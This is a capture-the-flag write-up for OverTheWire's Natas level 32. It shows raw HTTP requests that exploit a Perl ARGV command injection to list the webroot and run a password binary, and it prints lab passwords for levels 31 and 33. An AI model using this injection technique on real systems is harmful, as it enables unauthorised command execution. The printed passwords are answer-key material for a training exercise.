# Natas CTF Solutions  

## Natas Level 32  

### 🌐 **Challenge Description**  
Natas teaches the basics of server-side web security. Each level consists of a website located at:  
👉 `http://natasX.natas.labs.overthewire.org` (where **X** is the level number).  

---

### 🎯 **Goal**  
- Exploit a **command injection vulnerability** to execute a binary file in the webroot and retrieve the password for the next level.  

---

## 🚀 **Solution**  

### **Step 1: Open the URL**  
Visit:  
```  
http://natas32.natas.labs.overthewire.org  
```  

---

### **Step 2: Enter Login Credentials**  
- **Username:** `natas32`  
- **Password:** Use the password from Natas Level 31:  
```
NaIWhW2VIrKqrc7aroJVHOZvk3RQMi0B
```  

![Home_Page](https://github.com/user-attachments/assets/0f5cae76-3749-4df8-b6e2-ae1a73bdf614)

---

### **Step 3: Review the Source Code**  
The source code is identical to Natas Level 31, which means the vulnerability is still based on **unsanitized file input** being processed through shell commands:  

```perl
while (<$file>) {
    print;
}
```  

![Source_Code](https://github.com/user-attachments/assets/0f4175e4-174c-4a07-b373-b9303f29406e)

✅ This allows for **command injection** through the `ARGV` parameter.  

---

### **Step 4: List Files in the Webroot**  
We can use a shell command to list files:  

Modify the request using **Burp Suite**:  
```http
POST /index.pl?/bin/ls%20-al%20.%20| HTTP/1.1
Host: natas32.natas.labs.overthewire.org
Authorization: Basic bmF0YXMzMjptN2JmakFIcEpN... [base64]
Content-Type: multipart/form-data; boundary=---------------------------407327551338850085443757983336

-----------------------------407327551338850085443757983336
Content-Disposition: form-data; name="file";
Content-Type: text/plain

ARGV
-----------------------------407327551338850085443757983336
```

✅ **Explanation:**  
- `/bin/ls` → List files in the directory.  
- `%20` → Represents a space.  
- `-al .` → Lists all files (including hidden) in the current directory.  

![BurpSuite](https://github.com/user-attachments/assets/9ec37a0e-cdfd-4c9a-91b7-7e09248d80c5)

---

### **Step 5: Execute the `getpassword` Binary**  
From the file list, you'll see a binary named `getpassword`.  
Execute it using:  

```http
POST /index.pl?./getpassword%20| HTTP/1.1
Host: natas32.natas.labs.overthewire.org
Authorization: Basic bmF0YXMzMjptN2JmakFIcEpN... [base64]
Content-Type: multipart/form-data; boundary=---------------------------407327551338850085443757983336

-----------------------------407327551338850085443757983336
Content-Disposition: form-data; name="file";
Content-Type: text/plain

ARGV
-----------------------------407327551338850085443757983336
```

✅ **Explanation:**  
- `./getpassword` → Executes the binary to print the password.  
- `|` → Ensures the input is treated as a shell command.  

![Password](https://github.com/user-attachments/assets/ef8bdc81-5982-4875-b051-cd72b7fd5f45)

---

### **✅ Password for Natas Level 33**  
```
2v9nDlbSF7jvawaCncr5Z9kSzkmBeoCJ
```

---

## 💡 **Lessons Learned**  
✔️ **Command Injection:** Improper sanitization of input allows direct execution of shell commands.  
✔️ **File Execution:** If files or binaries are present in the webroot, they can be directly executed using command injection.  
✔️ **Burp Suite Manipulation:** Intercepting and modifying HTTP requests allows for testing hidden endpoints and vulnerabilities.  

---

## 🖼️ **Screenshots**  
| Step | Screenshot |  
|------|------------|  
| Step 4 – File Listing | ![BurpSuite](https://github.com/user-attachments/assets/9ec37a0e-cdfd-4c9a-91b7-7e09248d80c5) |  
| Step 5 – Command Execution | ![Password](https://github.com/user-attachments/assets/ef8bdc81-5982-4875-b051-cd72b7fd5f45) |  

---

## 🎯 **Next Level**  
Use the password to access **Natas Level 33**:  
👉 [http://natas33.natas.labs.overthewire.org](http://natas33.natas.labs.overthewire.org)  

---
